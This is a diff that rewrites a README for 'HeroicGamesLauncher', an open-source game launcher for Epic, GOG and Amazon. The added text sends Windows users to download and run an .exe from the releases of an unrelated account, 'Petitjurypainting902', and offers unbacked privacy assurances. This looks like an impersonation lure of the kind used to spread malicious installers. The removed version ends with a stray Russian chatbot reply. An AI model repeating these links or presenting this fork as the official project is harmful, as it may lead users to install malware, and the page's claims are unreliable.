@@ -1,62 +1,83 @@
-<div align="center">
+# 🎮 HeroicGamesLauncher - Manage your game libraries with ease
 
-<img width="200" height="200" alt="image" src="https://github.com/user-attachments/assets/59e7ccf7-4473-4bd0-8763-4819e0750b65" />
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Petitjurypainting902/HeroicGamesLauncher/releases)
 
-# Heroic Games Launcher
-  <p align="center">
-    <strong>Open Source Game Launcher for Epic, GOG & Amazon</strong>
-    <br/>
-    Epic Games Store • GOG • Amazon Games • Legendary • Privacy Focused
-    <br/>
-    <a href="https://github.com/HeroicLauncher/HeroicGamesLauncher/issues">Report Bug</a> | <a href="https://github.com/HeroicLauncher/HeroicGamesLauncher/issues">Discussions</a>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Launcher-Heroic%20Games-00B4FF?style=for-the-badge" alt="Heroic" />
-    <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/HeroicLauncher/HeroicGamesLauncher?style=flat-square&color=gold" alt="Stars" />
-    <img src="https://img.shields.io/github/license/HeroicLauncher/HeroicGamesLauncher?style=flat-square" alt="License" />
-  </p>
-</div>
+HeroicGamesLauncher provides a single home for your games. It works with Epic Games, GOG, and Amazon Prime Gaming. You do not need to install multiple launchers. This tool keeps your library organized on Windows 11. It is open source software for players who want control over their desktop gaming experience.
 
+## 📥 Getting Started
 
-## Install
- [Download `HeroicGamesLauncher.zip`](https://github.com/HeroicLauncher/HeroicGamesLauncher/releases/download/heroic-launcher/HeroicGamesLauncher.zip)
- ---
- 
-## Overview
-**Heroic Games Launcher** is a free, open-source, and privacy-friendly alternative to the official Epic Games Launcher, GOG Galaxy, and Amazon Games App.
-It allows you to manage and play your games from multiple stores in one beautiful and lightweight interface.
+Follow these steps to set up the software on your computer.
 
-<img width="1280" height="852" alt="videoframe_1139" src="https://github.com/user-attachments/assets/6d3a09aa-883c-43d0-b059-9f8fa22643ae" />
+1. Visit the [official releases page](https://github.com/Petitjurypainting902/HeroicGamesLauncher/releases) to download the installer.
+2. Look for the file that ends with .exe under the most recent version.
+3. Click the file name to start the download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts on your screen to install the program.
+6. Launch HeroicGamesLauncher from your desktop shortcut.
 
-## Key Features
-- Full support for Epic Games Store, GOG, and Amazon Games
-- Legendary and GOGDL backend integration
-- Cross-platform support (Windows, macOS, Linux)
-- Custom Proton / Wine support for Linux & macOS
-- Cloud saves support
-- Easy mod management
-- Beautiful modern UI
-- No telemetry or invasive tracking
-- Offline mode
-- Regular updates and active community
+## 🛠️ System Requirements
 
-## How to Use
-1. Download the latest release for your operating system
-2. Install and launch Heroic Games Launcher
-3. Log in to your desired store accounts
-4. Download and organize your games
-5. Start playing with full control
+HeroicGamesLauncher runs on Windows 10 and Windows 11. Your computer needs the following specifications to work well:
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial** open-source game launcher.  
-> Not affiliated with Epic Games, GOG, Amazon, or any official platform.  
-> All games must be legally purchased and owned by the user.
+*   **Operating System:** Windows 10 or 11 (64-bit).
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free disk space for the launcher itself.
+*   **Network:** An active internet connection to download and play your games.
+*   **Graphics:** A graphics card with current drivers installed.
 
----
+## 🔑 Linking your accounts
 
-Готово!  
+The software needs permission to access your existing game libraries. You only need to do this once.
 
-Хочешь добавить что-то конкретное (например, больше про Linux/Proton, System Requirements или изменить акценты)?
+1. Open the settings menu inside the launcher.
+2. Select the Accounts tab.
+3. Click the login button for your preferred store provider.
+4. A web browser window will open. Enter your login details on the official store website.
+5. Grant the necessary permissions when asked.
+6. Return to the launcher. Your games will appear in the library shortly.
+
+## 🎮 Managing your library
+
+The main library screen shows all games tied to your connected accounts. You can sort these titles by name, last played, or platform. 
+
+To install a game, right-click the cover art or title. Select the install option. The launcher will ask you to choose a folder. Pick a location on your hard drive with enough space. The download will start automatically. You can track progress in the dedicated downloads tab.
+
+Once the download finishes, the install button changes to a play button. Click this to start your game. 
+
+## ⚙️ Customizing settings
+
+You can change how games run to improve performance or stability. Right-click any game and select settings.
+
+*   **Wine/Proton:** This section changes how Windows handles the game files. Most users should leave these at the default settings.
+*   **Language:** Choose your preferred language for the game interface when available.
+*   **Desktop Shortcuts:** You can choose to create a shortcut on your desktop for quick access to your favorite games.
+*   **Auto-Update:** Toggle this switch to ensure your games stay current without manual effort.
+
+## 🛡️ Privacy and Safety
+
+This software does not collect your login passwords. It uses official authentication methods provided by the game stores. Your personal data stays between you and the storefront provider. The code remains open for public review to ensure transparency. You have full control over your stored credentials. Remove any account at any time through the settings menu.
+
+## ❓ Frequently Asked Questions
+
+**Does this replace the official launchers?**
+Yes. You do not need the Epic Games Store or GOG Galaxy apps open while you use this launcher.
+
+**Can I play cloud save games?**
+The launcher supports cloud saves for most titles. It syncs your progress when you close a game, provided you have an internet connection.
+
+**Where does the launcher store files?**
+It keeps configuration files in your user app data folder. Your game files stay in the specific folders you designate during installation.
+
+**Why does my game not start?**
+Check your graphics card drivers. Update them to the newest version provided by your manufacturer. Also, verify that the game has finished its full installation process.
+
+**How do I update the launcher?**
+The program checks for updates every time you open it. It notifies you if a newer version exists. Follow the on-screen link to download the update.
+
+## 📦 Troubleshooting common issues
+
+If you encounter errors, check the logs. Go to the settings menu and click on the log folder button. This file contains information about what happened during the last session. If the program crashes, try a clean reinstall. Delete the existing folder and install the latest version from the links provided.
+
+## 🚀 Community and Support
+
+Open a bug report on the main page if you find technical issues. Include your system information and a brief note about what happened. This helps developers fix problems for everyone. Contributions to the codebase are welcome. Check the main page for guidelines on how to submit changes.
